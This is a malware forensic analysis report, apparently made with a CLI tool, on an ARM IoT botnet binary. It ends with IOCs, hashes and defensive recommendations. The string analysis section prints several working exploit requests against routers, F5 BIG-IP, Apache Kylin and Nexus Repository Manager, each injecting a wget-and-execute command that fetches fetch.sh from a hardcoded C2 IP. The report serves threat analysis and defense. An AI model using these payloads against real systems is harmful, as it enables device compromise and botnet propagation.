# Forensic Analysis Report: sample_13

## File Information
- **File Path:** ./sample_files/sample_13
- **Analysis Date:** 2026-01-18
- **Analyst Tool:** LCRE CLI

---

## Step 1: Initial Triage Analysis

### Command:
```bash
./lcre triage ./sample_files/sample_13 -o md
```

### Output (Key Fields):
```json
{
  "metadata": {
    "path": "./sample_files/sample_13",
    "name": "sample_13",
    "size": 179383,
    "md5": "390f1382237b5a01dd46bf1404c223e7",
    "sha1": "28976d0de5260fcdc620240bbad78424addd6232",
    "sha256": "03254e6240c35f7d787ca5175ffc36818185e62bdfc4d88d5b342451a747156d",
    "format": "ELF",
    "arch": "ARM",
    "bits": 32,
    "endian": "little"
  }
}
```

### Thinking:
The file is a 32-bit ARM ELF binary, approximately 175KB in size. This is a Linux executable compiled for ARM architecture, which is commonly used on IoT devices, routers, and embedded systems. The format alone does not indicate malicious intent, but ARM binaries are frequently targeted for IoT malware.

---

## Step 2: Risk Assessment Summary

### Command:
```bash
./lcre query summary ./sample_files/sample_13
```

### Output:
```json
{
  "metadata": {
    "format": "ELF",
    "arch": "ARM",
    "size": 179383,
    "sha256": "03254e6240c35f7d787ca5175ffc36818185e62bdfc4d88d5b342451a747156d"
  },
  "yara_match_count": 0,
  "counts": {
    "sections": 29,
    "imports": 0,
    "exports": 0,
    "strings": 1628,
    "functions": 0,
    "iocs": 31
  },
  "cached": true
}
```

### Thinking:
Critical observations:
- **0 imports detected** - This is unusual for a dynamically linked binary, suggests statically linked
- **31 IOCs detected** - This is a HIGH number of indicators of compromise
- **0 YARA matches** - No built-in YARA rules triggered
- **1628 strings** - Significant amount of string data to analyze

The high IOC count is immediately concerning and warrants deeper investigation.

---

## Step 3: Import Analysis

### Command:
```bash
./lcre query imports ./sample_files/sample_13
```

### Output:
```json
{
  "imports": [],
  "count": 0
}
```

### Thinking:
The binary has no dynamic imports, indicating it is **statically linked**. This is a common technique for:
1. IoT malware to ensure portability across different systems
2. Reducing dependencies on target system libraries
3. Making the binary more self-contained and easier to deploy

This is consistent with IoT botnet malware patterns.

---

## Step 4: String Analysis

### Command:
```bash
./lcre query strings ./sample_files/sample_13 --limit 100
```

### Output (Critical Strings):
```json
{
  "strings": [
    {
      "value": "POST /upgrade_check.cgi HTTP/1.1\r\nHost: \r\nContent-Disposition: AAAA\r\nContent-Length: \r\nContent-Type: application/octet-stream\r\nname=\r\ncd+/tmp+rm+-rf+*+wget http://79.124.8.24/fetch.sh+sh+fetch.sh+rm fetch.sh\r\n\r\n",
      "offset": "0x19a60"
    },
    {
      "value": "POST /kylin/api/cubes/kylin_streaming_cube/ HTTP/1.1\r\nUser-Agent: curl/7.54.0\r\nAccept: */*\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n`wget+http://79.124.8.24/fetch.sh;chmod+777 fetch.sh;sh+fetch.sh`/migrate",
      "offset": "0x19b40"
    },
    {
      "value": "POST /boaform/admin/formPing HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n\r\n=;wget+-O+-+http%3A%2F%2F79.124.8.24%2Ffetch.sh+%7C+%2Ffetch%2Fsh+sh+fetch%2Fsh /&waninf=1_INTERNET_R_VID_154",
      "offset": "0x19c10"
    },
    {
      "value": "POST /service/extdirect HTTP/1.1\r\nAccept: application/json\r\nUser-Agent: Mozilla/5.0...\r\n\r\n{action:coreui_Role,method:create,data:[{...privileges:[$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cd /tmp wget http://79.124.8.24/fetch.sh chmod 777 fetch.sh sh fetch.sh')}],roles:[]}],type:rpc,tid:89}",
      "offset": "0x19cfc"
    },
    {
      "value": "POST /tips/tipsSimulationUpload HTTP/1.1\r\n...clientPassphrase=req- engine /tmp/clientCertFile*.txt uploadClientCertFile=@cd+/tmp/+wget+http://79.124.8.24/fetch.sh+chmod+777+fetch.sh+sh+fetch.sh",
      "offset": "0x19fa8"
    },
    {
      "value": "GET /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=cd+/tmp+rm +-rf+*;wget+http://79.124.8.24/fetch.sh;chmod+777+fetch.sh;sh +fetch.sh HTTP/1.1",
      "offset": "0x1a128"
    },
    {
      "value": "POST /config/hidden/saveHidden HTTP/1.1\r\n...anon_redirect=http://dereferer.org/?+display_all_seasons=on+git_path= +extra_scripts=cd+/tmp+wget+http//79.124.8.24/fetch.sh+chmod+777+fetch.sh+sh+fetch.sh",
      "offset": "0x1a220"
    },
    {
      "value": "78.142.18.20",
      "offset": "0x1a340"
    }
  ]
}
```

### Thinking:
**EXTREMELY ALARMING FINDINGS:**

1. **Multiple HTTP exploit payloads** - The binary contains pre-crafted HTTP requests targeting:
   - `/upgrade_check.cgi` - Router firmware upgrade interface
   - `/kylin/api/cubes/` - Apache Kylin API (CVE-2020-1956 style)
   - `/boaform/admin/formPing` - Realtek-based router command injection
   - `/service/extdirect` - Nexus Repository Manager (CVE-2020-10199/10204 style)
   - `/tips/tipsSimulationUpload` - Unknown web application exploit
   - `/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp` - F5 BIG-IP (CVE-2020-5902 style)
   - `/config/hidden/saveHidden` - SickChill/SickRage application exploit

2. **Shell command injection payloads** - All exploits contain:
   ```
   cd /tmp; rm -rf *; wget http://79.124.8.24/fetch.sh; chmod 777 fetch.sh; sh fetch.sh
   ```
   This pattern:
   - Changes to /tmp directory
   - Removes existing files
   - Downloads a shell script from C2 server
   - Makes it executable
   - Executes it

3. **Hardcoded C2 IP addresses:**
   - `79.124.8.24` - Primary C2 server (appears in all exploits)
   - `78.142.18.20` - Secondary C2 server

4. **Java deserialization exploit** - Contains `java.lang.Runtime().exec()` pattern for RCE

---

## Step 5: IOC Extraction

### Command:
```bash
./lcre query iocs ./sample_files/sample_13
```

### Output:
```json
{
  "iocs": [
    {
      "type": "ip",
      "value": "78.142.18.20",
      "offset": "0x1a340"
    },
    {
      "type": "ip",
      "value": "79.124.8.24",
      "offset": "0x19a60"
    },
    {
      "type": "url",
      "value": "http://79.124.8.24/fetch.sh",
      "offset": "0x19cfc"
    },
    {
      "type": "url",
      "value": "http://79.124.8.24/fetch.sh+chmod+777+fetch.sh+sh+fetch.sh",
      "offset": "0x19fa8"
    },
    {
      "type": "url",
      "value": "http://79.124.8.24/fetch.sh+sh+fetch.sh+rm",
      "offset": "0x19a60"
    },
    {
      "type": "url",
      "value": "http://79.124.8.24/fetch.sh;chmod+777",
      "offset": "0x19b40"
    },
    {
      "type": "url",
      "value": "http://79.124.8.24/fetch.sh;chmod+777+fetch.sh;sh",
      "offset": "0x1a128"
    },
    {
      "type": "url",
      "value": "http://dereferer.org/?+display_all_seasons=on+git_path=",
      "offset": "0x1a220"
    },
    {
      "type": "domain",
      "value": "dereferer.org",
      "offset": "0x1a220"
    },
    {
      "type": "domain",
      "value": "fetch.sh",
      "offset": "0x19a60"
    },
    {
      "type": "path",
      "value": "/proc/cpuinfo",
      "offset": "0x1b330"
    },
    {
      "type": "path",
      "value": "/proc/stat",
      "offset": "0x1b324"
    },
    {
      "type": "path",
      "value": "/tmp/clientCertFile*.txt uploadClientCertFile=@cd+/tmp/+wget+http:",
      "offset": "0x19fa8"
    }
  ],
  "count": 31,
  "by_type": {
    "domain": 12,
    "ip": 2,
    "path": 11,
    "url": 6
  }
}
```

### Thinking:
IOC Summary:
- **2 IP addresses** - Both appear to be C2 servers
- **6 URLs** - All pointing to malicious payload delivery
- **12 domains** - Mix of legitimate-looking domains and exploit artifacts
- **11 paths** - Include system paths (/proc/cpuinfo, /proc/stat) for system enumeration

The presence of `/proc/cpuinfo` and `/proc/stat` access indicates system reconnaissance functionality.

---

## Step 6: YARA Analysis

### Command:
```bash
./lcre query yara ./sample_files/sample_13
```

### Output:
```json
{
  "path": "/home/maxime/scratch/lcre/sample_files/sample_13",
  "yara_available": true
}
```

### Thinking:
No specific YARA rules matched, but this doesn't mean the file is safe. The embedded exploit payloads and C2 infrastructure clearly indicate malicious intent.

---

## Step 7: Section Analysis

### Command:
```bash
./lcre query sections ./sample_files/sample_13
```

### Output:
```json
{
  "sections": [
    {
      "name": ".text",
      "virtual_addr": "0x80f0",
      "virtual_size": 104796,
      "raw_size": 104796,
      "entropy": 6.0173336199698415,
      "permissions": "r-x",
      "high_entropy": false
    },
    {
      "name": ".rodata",
      "virtual_addr": "0x21a60",
      "virtual_size": 8260,
      "raw_size": 8260,
      "entropy": 6.0173336199698415,
      "permissions": "r--",
      "high_entropy": false
    },
    {
      "name": ".data",
      "virtual_addr": "0x2c0c0",
      "virtual_size": 528,
      "raw_size": 528,
      "entropy": 6.0173336199698415,
      "permissions": "rw-",
      "high_entropy": false
    },
    {
      "name": ".bss",
      "virtual_addr": "0x2c2d0",
      "virtual_size": 12988,
      "raw_size": 12988,
      "entropy": 6.0173336199698415,
      "permissions": "rw-",
      "high_entropy": false
    }
  ],
  "count": 29
}
```

### Thinking:
Section analysis shows:
- **29 sections** total - typical for a statically-linked ELF
- **Entropy ~6.0** across all sections - no signs of packing/encryption
- **Debug sections present** (debug_info, debug_line, etc.) - may indicate less sophisticated malware development
- **Large .text section** (104KB) - contains the main code
- **Standard permissions** - no anomalous rwx sections

The presence of debug symbols and non-packed sections suggests this is a "commodity" malware, likely from a public botnet source code.

---

## Step 8: Additional String Analysis

### Command:
```bash
./lcre query strings ./sample_files/sample_13 --limit 200 --offset 100
```

### Key Additional Findings:
```
- "GCC: (GNU) 4.2.1" - Compiled with older GCC
- "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" - Multiple compiler versions
- "/proc/stat", "/proc/cpuinfo" - System enumeration
- "/sys/devices/system/cpu" - CPU detection
- "/etc/resolv.conf" - DNS configuration access
- "/etc/hosts" - Host file access
- "/dev/null" - Standard device access
- "nameserver", "domain", "search" - DNS parsing
- Socket-related error strings (standard C library)
```

### Thinking:
Additional evidence of:
1. **System reconnaissance** - Reading CPU info, process stats
2. **Network configuration enumeration** - Parsing resolv.conf and hosts
3. **Statically linked C library** - All standard error strings embedded
4. **Cross-compilation** - Built using aboriginal toolchain for ARM

---

## Summary of Malicious Indicators

### Critical Findings:

1. **Multiple Exploit Payloads:**
   - F5 BIG-IP CVE-2020-5902 style path traversal
   - Apache Kylin command injection
   - Realtek router command injection
   - Nexus Repository Manager Java deserialization
   - Generic router/IoT exploits

2. **Command & Control Infrastructure:**
   - Primary C2: `79.124.8.24`
   - Secondary C2: `78.142.18.20`
   - Payload URL: `http://79.124.8.24/fetch.sh`

3. **Malicious Behavior Patterns:**
   - Downloads and executes shell scripts
   - Self-propagation mechanism via wget
   - Targets IoT/router devices
   - Uses `/tmp` as working directory
   - Cleans up after itself (`rm fetch.sh`)

4. **Architecture Indicators:**
   - ARM 32-bit statically linked binary
   - Compiled with older GCC for maximum compatibility
   - Built for IoT/embedded device infection

---

## Classification

| Attribute | Value |
|-----------|-------|
| **Classification** | **MALICIOUS** |
| **Confidence** | **HIGH** |
| **Malware Type** | IoT Botnet / Scanner / Exploiter |
| **Threat Level** | Critical |

---

## Reasoning

This binary is classified as **MALICIOUS** with **HIGH** confidence based on:

1. **Explicit exploit payloads** - The binary contains fully-formed HTTP requests designed to exploit known vulnerabilities in routers, web applications, and network appliances.

2. **Command & Control infrastructure** - Hardcoded IP addresses and URLs for downloading additional payloads are embedded in the binary.

3. **Malicious shell commands** - Clear evidence of commands designed to download, execute, and clean up malicious scripts.

4. **Target profile** - ARM architecture, statically linked, targeting IoT/router devices matches known IoT botnet patterns (similar to Mirai variants).

5. **Self-propagation capability** - The exploit payloads are designed to spread the malware to additional vulnerable devices.

This is characteristic of an **IoT botnet scanner/spreader** that exploits multiple vulnerabilities to propagate to vulnerable devices. The pattern matches known threats like Mirai, Mozi, or similar IoT botnets.

---

## Indicators of Compromise (IOCs)

### IP Addresses:
- `79.124.8.24` (C2 Server)
- `78.142.18.20` (C2 Server)

### URLs:
- `http://79.124.8.24/fetch.sh`

### File Hashes:
- **MD5:** `390f1382237b5a01dd46bf1404c223e7`
- **SHA1:** `28976d0de5260fcdc620240bbad78424addd6232`
- **SHA256:** `03254e6240c35f7d787ca5175ffc36818185e62bdfc4d88d5b342451a747156d`

### Targeted Vulnerabilities:
- F5 BIG-IP (CVE-2020-5902 style)
- Apache Kylin RCE
- Realtek router command injection
- Nexus Repository Manager RCE
- Various CGI-based router interfaces

---

## Recommendations

1. **Block C2 IPs** at network perimeter: `79.124.8.24`, `78.142.18.20`
2. **Hunt for IOCs** across environment
3. **Patch affected systems** - especially F5 BIG-IP, routers, and web applications
4. **Monitor for suspicious outbound connections** to these IP addresses
5. **Review IoT device security** and update firmware
